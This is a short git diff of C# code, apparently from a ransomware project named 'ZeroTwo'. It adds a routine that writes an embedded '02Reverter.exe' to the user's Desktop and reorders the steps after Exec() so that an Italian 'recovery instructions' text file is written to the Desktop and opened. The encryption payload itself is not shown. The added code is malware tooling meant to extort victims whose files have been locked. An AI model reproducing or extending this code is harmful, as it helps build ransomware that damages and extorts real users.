@@ -30,8 +30,9 @@ namespace ZeroTwo.src {
                 OpenImage();
             } else if (int.Parse(args[0]) == EXEC_FLAG) {
                 Exec();
-                Clear();
+                ReleaseReverter();
                 ReleaseIstructions();
+                Clear();
             }
         }
 
@@ -179,13 +180,21 @@ namespace ZeroTwo.src {
         private static void ReleaseIstructions() {
             var assembly = Assembly.GetExecutingAssembly();
             var instructionsRes = "ZeroTwo.src.txt.Instructions";
-
             using (Stream stream = assembly.GetManifestResourceStream(instructionsRes))
             using (StreamReader reader = new StreamReader(stream)) {
                 string instructions = reader.ReadToEnd();
                 string instructionsPath = "C:/users/" + Environment.UserName + "/Desktop/Istruzioni recupero.txt";
                 File.WriteAllText(instructionsPath, instructions);
                 Process.Start(instructionsPath);
+            }
+        }
+
+        private static void ReleaseReverter() {
+            var revRes = "ZeroTwo.src.rev.02Reverter";
+            using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(revRes)) {
+                using (var file = new FileStream("C:/users/" + Environment.UserName + "/Desktop/02Reverter.exe", FileMode.Create, FileAccess.Write)) {
+                    sfile.CopyTo(file);
+                }
             }
         }
     }
